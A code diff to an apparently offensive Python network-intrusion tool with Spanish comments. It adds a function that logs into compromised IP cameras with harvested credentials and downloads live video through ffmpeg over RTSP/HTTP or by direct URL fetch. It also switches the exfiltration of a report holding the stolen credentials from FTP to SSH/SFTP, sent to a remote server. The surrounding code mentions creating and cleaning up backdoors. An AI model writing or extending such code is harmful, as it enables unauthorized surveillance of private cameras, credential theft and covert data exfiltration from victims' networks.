@@ -1832,7 +1832,10 @@ WantedBy=multi-user.target
                 # 4. Tomar screenshots de prueba
                 screenshots = self._capture_camera_screenshots(camera, credentials)
                 
-                # 5. Generar URLs de acceso
+                # 5. Descargar video de prueba (5 segundos o 100MB)
+                video_file = self._download_camera_video(camera, credentials)
+                
+                # 6. Generar URLs de acceso
                 access_urls = self._generate_camera_urls(camera, credentials)
                 
                 return {
@@ -1843,6 +1846,7 @@ WantedBy=multi-user.target
                     'credentials': credentials,
                     'camera_info': camera_info,
                     'screenshots': screenshots,
+                    'video_file': video_file,
                     'access_urls': access_urls,
                     'timestamp': time.time()
                 }
@@ -2063,6 +2067,95 @@ WantedBy=multi-user.target
         ]
         
         return urls
+    
+    def _download_camera_video(self, camera: Dict[str, Any], credentials: Dict[str, str]) -> Optional[str]:
+        """Descargar 5 segundos de video o 100MB como prueba de la cámara"""
+        try:
+            import subprocess
+            import os
+            import time
+            
+            host = camera['host']
+            port = camera['port']
+            username = credentials['username']
+            password = credentials['password']
+            
+            # Crear directorio para videos
+            video_dir = f"camera_videos_{int(time.time())}"
+            os.makedirs(video_dir, exist_ok=True)
+            
+            # Generar nombre de archivo
+            timestamp = int(time.time())
+            video_filename = f"camera_{host}_{port}_video_{timestamp}.mp4"
+            video_path = os.path.join(video_dir, video_filename)
+            
+            print(f"   📹 Descargando video de prueba de {host}:{port}...")
+            
+            # Intentar diferentes métodos de descarga de video
+            video_downloaded = False
+            
+            # Método 1: RTSP stream con ffmpeg
+            rtsp_url = f"rtsp://{username}:{password}@{host}:{port}/stream1"
+            try:
+                command = [
+                    'ffmpeg', '-i', rtsp_url, '-t', '5', '-c', 'copy', 
+                    '-f', 'mp4', video_path, '-y'
+                ]
+                result = subprocess.run(command, capture_output=True, timeout=30)
+                if result.returncode == 0 and os.path.exists(video_path) and os.path.getsize(video_path) > 0:
+                    video_downloaded = True
+                    print(f"   ✅ Video descargado via RTSP: {video_filename}")
+            except Exception as e:
+                print(f"   ⚠️ RTSP falló: {e}")
+            
+            # Método 2: HTTP stream con ffmpeg
+            if not video_downloaded:
+                http_url = f"http://{username}:{password}@{host}:{port}/video.mjpg"
+                try:
+                    command = [
+                        'ffmpeg', '-i', http_url, '-t', '5', '-c', 'copy', 
+                        '-f', 'mp4', video_path, '-y'
+                    ]
+                    result = subprocess.run(command, capture_output=True, timeout=30)
+                    if result.returncode == 0 and os.path.exists(video_path) and os.path.getsize(video_path) > 0:
+                        video_downloaded = True
+                        print(f"   ✅ Video descargado via HTTP: {video_filename}")
+                except Exception as e:
+                    print(f"   ⚠️ HTTP stream falló: {e}")
+            
+            # Método 3: Descarga directa de archivo de video
+            if not video_downloaded:
+                video_urls = [
+                    f"http://{username}:{password}@{host}:{port}/video.mp4",
+                    f"http://{username}:{password}@{host}:{port}/stream.mp4",
+                    f"http://{username}:{password}@{host}:{port}/live.mp4"
+                ]
+                
+                for video_url in video_urls:
+                    try:
+                        import urllib.request
+                        with urllib.request.urlopen(video_url, timeout=10) as response:
+                            data = response.read(100 * 1024 * 1024)  # 100MB máximo
+                            if data:
+                                with open(video_path, 'wb') as f:
+                                    f.write(data)
+                                video_downloaded = True
+                                print(f"   ✅ Video descargado via HTTP directo: {video_filename}")
+                                break
+                    except Exception as e:
+                        continue
+            
+            if video_downloaded and os.path.exists(video_path):
+                file_size = os.path.getsize(video_path)
+                print(f"   📊 Tamaño del video: {file_size / 1024 / 1024:.2f} MB")
+                return video_path
+            else:
+                print(f"   ❌ No se pudo descargar video de {host}:{port}")
+                return None
+                
+        except Exception as e:
+            print(f"   ❌ Error descargando video: {e}")
+            return None
     
     def _capture_camera_screenshots(self, camera: Dict[str, Any], credentials: Dict[str, str]) -> List[str]:
         """Capturar screenshots de prueba de la cámara"""
@@ -3327,8 +3420,8 @@ WantedBy=multi-user.target
                 print(f"     Credenciales: {camera['credentials']['username']}:{camera['credentials']['password']}")
                 print(f"     URLs de acceso: {len(camera.get('access_urls', {}).get('web_interface', []))} disponibles")
         
-        # Enviar reporte por FTP
-        self._upload_report_via_ftp(report_file)
+        # Enviar reporte por SSH
+        self._upload_report_via_ssh(report_file)
         
         # Mostrar resumen de accesos remotos disponibles
         self._show_remote_access_summary()
@@ -3502,8 +3595,8 @@ WantedBy=multi-user.target
         # Generar reporte
         report_file = self.generate_report()
         
-        # Enviar reporte por FTP
-        self._upload_report_via_ftp(report_file)
+        # Enviar reporte por SSH
+        self._upload_report_via_ssh(report_file)
         
         # Preguntar antes de limpiar para probar backdoors
         print("\n" + "=" * 60)
@@ -3862,40 +3955,43 @@ WantedBy=multi-user.target
             print(f"❌ Error creando backdoor genérico: {e}")
             return None
     
-    def _upload_report_via_ftp(self, report_file: str):
-        """Subir reporte por FTP al servidor remoto"""
+    def _upload_report_via_ssh(self, report_file: str):
+        """Subir reporte por SSH/SCP al servidor remoto"""
         try:
-            import ftplib
+            import paramiko
             import os
             
-            ftp_config = self.config_data['ftp_upload']
-            host = ftp_config['host']
-            username = ftp_config['username']
-            password = ftp_config['password']
+            ssh_config = self.config_data['ssh_upload']
+            host = ssh_config['host']
+            port = ssh_config['port']
+            username = ssh_config['username']
+            password = ssh_config['password']
             
-            print(f"\n📤 Enviando reporte por FTP a {host}...")
+            print(f"\n📤 Enviando reporte por SSH a {host}:{port}...")
             
-            # Conectar al servidor FTP
-            ftp = ftplib.FTP(host)
-            ftp.login(username, password)
+            # Crear cliente SSH
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
             
-            # Cambiar al directorio de reportes (crear si no existe)
-            try:
-                ftp.cwd('/reports')
-            except ftplib.error_perm:
-                ftp.mkd('/reports')
-                ftp.cwd('/reports')
+            # Conectar al servidor SSH
+            ssh.connect(host, port=port, username=username, password=password)
             
-            # Subir el archivo
-            with open(report_file, 'rb') as file:
-                filename = os.path.basename(report_file)
-                ftp.storbinary(f'STOR {filename}', file)
+            # Crear directorio de reportes si no existe
+            stdin, stdout, stderr = ssh.exec_command('mkdir -p /reports')
+            stdout.channel.recv_exit_status()
             
-            ftp.quit()
+            # Subir archivo usando SCP
+            sftp = ssh.open_sftp()
+            filename = os.path.basename(report_file)
+            remote_path = f'/reports/{filename}'
+            sftp.put(report_file, remote_path)
+            sftp.close()
+            
+            ssh.close()
             print(f"✅ Reporte enviado exitosamente: {filename}")
             
         except Exception as e:
-            print(f"❌ Error enviando reporte por FTP: {e}")
+            print(f"❌ Error enviando reporte por SSH: {e}")
             print("💡 El reporte se mantiene localmente en el equipo")
     
     def _cleanup_vulnerable_service_backdoors(self):
